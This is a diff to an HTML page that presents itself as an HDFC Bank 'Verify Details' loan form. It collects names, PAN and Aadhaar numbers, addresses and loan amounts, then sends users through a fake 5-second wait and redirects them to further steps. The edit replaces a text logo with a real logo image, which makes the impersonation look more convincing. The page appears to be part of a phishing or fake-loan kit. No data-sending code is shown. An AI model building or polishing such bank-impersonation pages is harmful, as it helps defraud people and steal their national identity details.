@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HDFC Bank - Verify Details</title>
+    <link rel="stylesheet" href="style.css">
     <style>
         :root {
             --hdfc-blue: #004c8f;
@@ -23,19 +24,14 @@
             position: relative;
         }
         
-        /* White HDFC Logo */
-        .logo-box {
-            background-color: white;
-            display: inline-flex;
-            align-items: center;
-            padding: 5px 10px;
-            border-radius: 2px;
+        /* Logo settings for logo.png */
+        .real-logo-img { 
+            height: 40px; 
+            width: auto;
             margin-bottom: 25px;
-        }
-        .logo-box span {
-            color: var(--hdfc-blue);
-            font-weight: 900;
-            font-size: 16px;
+            background-color: white; /* Logo ke peeche white background agar zarurat ho */
+            padding: 5px;
+            border-radius: 2px;
         }
 
         .progress-row {
@@ -145,9 +141,7 @@
 <body>
 
     <div class="header-main">
-        <div class="logo-box">
-            <span>HDFC BANK</span>
-        </div>
+        <img src="logo.png" alt="HDFC BANK" class="real-logo-img">
         
         <div class="progress-row">
             <div class="step-info">
@@ -227,10 +221,8 @@
             const fields = ['firstName', 'lastName', 'panCard', 'aadharCard', 'addr1', 'pincode', 'loanType', 'loanAmount'];
             const btn = document.getElementById('submitBtn');
             
-            // Validation errors reset karein
             fields.forEach(id => document.getElementById(id).classList.remove('error-border'));
 
-            // Check empty fields
             fields.forEach(id => {
                 const el = document.getElementById(id);
                 if (!el.value || el.value.trim() === "") {
@@ -239,7 +231,6 @@
                 }
             });
 
-            // PAN aur Aadhaar length check
             const pan = document.getElementById('panCard').value;
             const aadhar = document.getElementById('aadharCard').value;
 
@@ -247,30 +238,25 @@
             if(aadhar.length < 12) { document.getElementById('aadharCard').classList.add('error-border'); isValid = false; }
 
             if (!isValid) {
-                // Agar galat hai to vibrate karein
                 if (navigator.vibrate) { navigator.vibrate([200, 100, 200]); }
                 return;
             }
 
-            // --- LOADING START ---
-            btn.disabled = true; // Button band karein
-            btn.innerText = "Please wait... (5s)"; // Text badlein
+            btn.disabled = true; 
+            btn.innerText = "Please wait... (5s)"; 
             
-            // 5 second ka wait
             setTimeout(function() {
                 const amount = document.getElementById('loanAmount').value;
                 localStorage.setItem('userLoanAmount', amount);
 
                 const selectedLoan = document.getElementById('loanType').value;
                 
-                // Redirect logic
                 if (selectedLoan === "personal") {
                     window.location.href = "enter2.html";
                 } else if (selectedLoan === "document") {
                     window.location.href = "doc1.html";
                 }
             }, 5000); 
-            // --- LOADING END ---
         }
     </script>
 </body>
